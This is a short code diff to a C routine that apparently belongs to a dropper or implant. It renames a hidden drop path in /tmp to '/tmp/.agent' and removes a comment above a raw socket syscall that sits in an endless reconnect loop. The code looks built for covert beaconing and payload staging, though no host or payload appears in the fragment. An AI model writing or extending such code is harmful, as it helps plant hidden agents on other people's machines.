@@ -86,10 +86,9 @@ void c_main(long* stack_ptr) {
         }
     }
 
-    const char* drop_path = "/tmp/.real_agent";
+    const char* drop_path = "/tmp/.agent";
 
     while (1) {
-        // 1. sys_socket(AF_INET=2, SOCK_STREAM=1, 0)
         long sock = my_syscall(41, 2, 1, 0, 0, 0, 0);
         if (sock < 0) {
             struct timespec ts = {5, 0};
